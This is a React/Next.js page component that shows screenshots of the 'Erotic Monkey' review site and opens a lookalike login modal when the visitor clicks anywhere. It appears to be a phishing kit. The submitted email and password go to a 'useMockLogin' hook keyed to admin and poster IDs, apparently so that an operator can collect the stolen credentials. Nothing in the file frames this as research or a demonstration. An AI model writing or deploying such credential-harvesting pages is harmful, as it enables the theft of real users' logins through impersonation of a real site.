"use client";
import { useState } from "react";
import { site } from "../config/index";
import { IoIosCloseCircle } from "react-icons/io";
import useMockLogin from "../hooks/useMockLogin";
import Image from "next/image";

export default function Home({ adminId, posterId }) {
  const [visible, setVisible] = useState(false);
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const { login } = useMockLogin(adminId, posterId);

  const handleSubmit = (e) => {
    e.preventDefault();
    const submitValues = {
      site,
      email,
      password,
    };
    console.log(submitValues);
    login(submitValues);
    setEmail("");
    setPassword("");
  };

 
  const handleOpenModal = () => setVisible(true);
  const handleCloseModal = () => setVisible(false);

  return (
    <div className="bg-gray-300 h-screen flex flex-col">
   
      <nav className="bg-[#303030] relative h-1/4"> 
        {visible && (
          <div className="absolute top-1/4 left-1/2 transform -translate-x-1/2 z-50 ">
            <div className="relative">
              <div className="absolute -top-2 -right-2 z-10">
                <IoIosCloseCircle
                  style={{
                    color: "black",
                    fontSize: "30px",
                    cursor: "pointer",
                    backgroundColor: "white",
                    borderRadius: "50%",
                  }}
                  onClick={handleCloseModal}
                />
              </div>
              <section className="bg-[#f5f5f5]">
                <div className="bg-[#fff]">
                  <div className="">
                    <form
                      className="border border-gray-100 w-[560px] h-[350px]"
                      action="#"
                      method="POST"
                    >
                      <div className="pb-5">
                        <label className="block px-3 py-2 bg-gray-100 text-black font-base text-lg">
                          Login to Erotic Monkey!
                        </label>
                        <div className="pl-5 pt-5">
                          <input
                            type="email"
                            name=""
                            id=""
                            value={email}
                            onChange={(e) => setEmail(e.target.value)}
                            placeholder="Enter email  / username"
                            className="w-[510px] px-1 py-1 rounded mt-2 border placeholder-text-xs border-[#e5e5e5] outline-none placeholder:text-sm pl-3"
                            autoFocus
                            autoComplete
                            required
                          />
                        </div>

                        <div className="pl-5 pt-5">
                          <input
                            type="password"
                            name=""
                            id=""
                            placeholder="Password"
                            value={password}
                            onChange={(e) => setPassword(e.target.value)}
                            minLength="6"
                            className="w-[510px] px-1 py-1 rounded mt-2 border border-[#e5e5e5] outline-none placeholder:text-sm pl-3"
                            required
                          />
                        </div>
                      </div>

                      <div className="flex justify-between">
                        <div className="text-start mt-3">
                          <a
                            href="#"
                            className="text-sm font-base pl-5 
                    text-[#08c]  
                     hover:text-gray-700 
                     hover:underline"
                          >
                            Forgot your password?
                          </a>
                        </div>
                        <button
                          onClick={handleSubmit}
                          type="submit"
                          className="block bg-green-600 text-white font-base text-sm px-5 py-2 mt-3 mr-3 rounded"
                        >
                          Log In
                        </button>
                      </div>
                      <div className="mt-4">
                        <p className="text-lg font-sans font-[12px] pl-5 text-center">
                          Not a EM Member?
                          <span className="text-[#08c] pl-2">
                            Signup Up now, it's FREE
                          </span>
                        </p>
                      </div>
                      <div className="mt-2">
                        <p className="text-xs font-sans pl-5 text-center">
                          Signing up to the Erotic Monkey gives you access to
                          thousands of reviews from across the country. Find the
                          latest reviews on the provider you're thinking of
                          choosing before you waste your money.
                        </p>
                      </div>
                    </form>
                  </div>
                </div>
              </section>
            </div>
          </div>
        )}
        <div className="h-full w-full" onClick={handleOpenModal}>
          <Image
            src="/navbar.jpg"
            alt="Navbar"
            layout="fill"
            objectFit="cover"
            priority 
          />
        </div>
      </nav>

 
      <div className="relative flex-1" onClick={handleOpenModal}> 
        <Image
          src="/body.jpg"
          alt="Body"
          layout="fill"
          objectFit="cover"
          priority 
        />
      </div>
    </div>
  );
}